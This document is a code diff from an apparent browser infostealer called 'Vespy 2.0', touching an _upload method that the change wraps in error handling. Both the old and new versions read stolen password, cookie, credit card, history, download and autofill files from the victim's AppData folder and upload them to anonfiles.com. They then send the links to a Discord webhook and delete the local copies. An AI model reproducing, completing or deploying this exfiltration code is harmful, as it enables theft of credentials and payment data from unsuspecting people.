@@ -209,22 +209,25 @@ class Browsers():
         f.close()
 
     def _upload(self):
-        apdata = os.path.join(os.environ["USERPROFILE"], "AppData")
-        PasswordSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Passw.txt"),"rb")}).json()['data']['file']['url']['full']
-        CookieSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Cookies.txt"),"rb")}).json()['data']['file']['url']['full']
-        CredsSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "credsc.txt"),"rb")}).json()['data']['file']['url']['full']
-        HistorySite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Histo.txt"),"rb")}).json()['data']['file']['url']['full']
-        DownloadSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Downs.txt"),"rb")}).json()['data']['file']['url']['full']
-        AutofillSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Autofill.txt"),"rb")}).json()['data']['file']['url']['full']
-        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
-        embed = DiscordEmbed(title=f"Browser Stealer", description=f"Found Information About Browsers", color='4300d1')
-        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
-        embed.set_footer(text='Vespy 2.0 | by : vesper')
-        embed.set_timestamp()
-        embed.add_embed_field(name=f"All Info From Browsers\n\n", value=f":unlock: Passwords: **{PasswordSite}**\n\n:cookie: Cookies: **{CookieSite}**\n\n:credit_card: CCs: **{CredsSite}**\n\n:page_with_curl: History: **{HistorySite}**\n\n:arrow_down: Downloads: **{DownloadSite}**\n\n:identification_card: Autofill: **{AutofillSite}**\n")
-        webhook.add_embed(embed)
-        webhook.execute()
         try:
-            os.remove(os.path.join(apdata, "Cookies.txt"));os.remove(os.path.join(apdata, "Passw.txt"));os.remove(os.path.join(apdata, "credsc.txt"));os.remove(os.path.join(apdata, "Histo.txt"));os.remove(os.path.join(apdata, "Downs.txt"));os.remove(os.path.join(apdata, "Autofill.txt"))
+            apdata = os.path.join(os.environ["USERPROFILE"], "AppData")
+            PasswordSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Passw.txt"),"rb")}).json()['data']['file']['url']['full']
+            CookieSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Cookies.txt"),"rb")}).json()['data']['file']['url']['full']
+            CredsSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "credsc.txt"),"rb")}).json()['data']['file']['url']['full']
+            HistorySite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Histo.txt"),"rb")}).json()['data']['file']['url']['full']
+            DownloadSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Downs.txt"),"rb")}).json()['data']['file']['url']['full']
+            AutofillSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Autofill.txt"),"rb")}).json()['data']['file']['url']['full']
+            webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
+            embed = DiscordEmbed(title=f"Browser Stealer", description=f"Found Information About Browsers", color='4300d1')
+            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
+            embed.set_footer(text='Vespy 2.0 | by : vesper')
+            embed.set_timestamp()
+            embed.add_embed_field(name=f"All Info From Browsers\n\n", value=f":unlock: Passwords: **{PasswordSite}**\n\n:cookie: Cookies: **{CookieSite}**\n\n:credit_card: CCs: **{CredsSite}**\n\n:page_with_curl: History: **{HistorySite}**\n\n:arrow_down: Downloads: **{DownloadSite}**\n\n:identification_card: Autofill: **{AutofillSite}**\n")
+            webhook.add_embed(embed)
+            webhook.execute()
+            try:
+                os.remove(os.path.join(apdata, "Cookies.txt"));os.remove(os.path.join(apdata, "Passw.txt"));os.remove(os.path.join(apdata, "credsc.txt"));os.remove(os.path.join(apdata, "Histo.txt"));os.remove(os.path.join(apdata, "Downs.txt"));os.remove(os.path.join(apdata, "Autofill.txt"))
+            except:
+                pass
         except:
             pass
